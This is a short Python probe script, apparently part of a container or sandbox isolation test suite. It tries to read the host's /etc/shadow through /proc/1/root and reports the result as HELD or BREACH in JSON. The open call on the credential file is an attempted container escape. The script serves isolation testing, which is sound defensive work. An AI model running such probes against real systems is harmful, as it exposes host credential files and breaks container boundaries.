#!/usr/bin/env python3
"""Attack: fs_proc_root — Direct open of /proc/1/root host filesystem"""
import json, os, sys, time

def run():
    result = {"vector": "fs_proc_root", "category": "filesystem",
              "status": "HELD", "evidence": "", "duration_ms": 0}
    start = time.time()
    target = os.environ.get("TARGET_PATH", "/proc/1/root/etc/shadow")

    print(json.dumps({"type": "log", "line": f"opening {target}"}))
    sys.stdout.flush()

    try:
        with open(target, "r") as f:
            content = f.read(256)
        result["status"] = "BREACH"
        result["evidence"] = f"read {len(content)} bytes from {target} — host filesystem exposed"
    except PermissionError:
        result["evidence"] = f"permission denied on {target} — PID namespace isolated"
    except FileNotFoundError:
        result["evidence"] = f"{target} not accessible"
    except OSError as e:
        result["evidence"] = f"OS error: {e}"

    result["duration_ms"] = int((time.time() - start) * 1000)
    print(json.dumps({"type": "result", **result}))
    sys.stdout.flush()

if __name__ == "__main__":
    run()
